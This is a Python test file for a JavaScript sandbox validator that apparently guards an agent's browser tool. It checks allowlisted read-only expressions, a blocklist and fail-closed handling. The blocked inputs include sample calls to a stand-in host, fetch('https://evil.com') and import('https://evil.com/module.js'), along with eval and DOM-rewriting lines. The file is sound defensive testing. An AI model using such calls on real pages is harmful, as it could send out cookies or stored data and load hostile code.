"""Tests for JavaScript execution sandbox."""

from src.tools.js_sandbox import validate_javascript


class TestJsSandbox:
    # --- Allowlisted patterns should pass ---

    def test_allows_localstorage(self):
        ok, _ = validate_javascript("JSON.stringify(localStorage)")
        assert ok

    def test_allows_document_title(self):
        ok, _ = validate_javascript("document.title")
        assert ok

    def test_allows_location_href(self):
        ok, _ = validate_javascript("window.location.href")
        assert ok

    def test_allows_document_cookie(self):
        ok, _ = validate_javascript("document.cookie")
        assert ok

    def test_allows_query_selector_text(self):
        ok, _ = validate_javascript('document.querySelector("#main").textContent')
        assert ok

    def test_allows_queryselectorall_length(self):
        ok, _ = validate_javascript('document.querySelectorAll("a").length')
        assert ok

    def test_allows_body_innertext(self):
        ok, _ = validate_javascript("document.body.innerText")
        assert ok

    def test_allows_navigator(self):
        ok, _ = validate_javascript("navigator.userAgent")
        assert ok

    # --- Blocklisted patterns should be blocked ---

    def test_blocks_fetch(self):
        ok, reason = validate_javascript("fetch('https://evil.com')")
        assert not ok
        assert "Blocked" in reason

    def test_blocks_xmlhttprequest(self):
        ok, _ = validate_javascript("new XMLHttpRequest()")
        assert not ok

    def test_blocks_innerhtml_assignment(self):
        ok, _ = validate_javascript("document.body.innerHTML = '<h1>hacked</h1>'")
        assert not ok

    def test_blocks_eval(self):
        ok, _ = validate_javascript("eval('alert(1)')")
        assert not ok

    def test_blocks_document_write(self):
        ok, _ = validate_javascript("document.write('hello')")
        assert not ok

    def test_blocks_settimeout(self):
        ok, _ = validate_javascript("setTimeout(() => {}, 100)")
        assert not ok

    def test_blocks_import(self):
        ok, _ = validate_javascript("import('https://evil.com/module.js')")
        assert not ok

    # --- Unknown patterns should fail-closed ---

    def test_blocks_unknown_pattern(self):
        ok, reason = validate_javascript("someRandomProperty.value")
        assert not ok
        assert "does not match any allowed pattern" in reason

    def test_blocks_empty_script(self):
        ok, _ = validate_javascript("")
        assert not ok
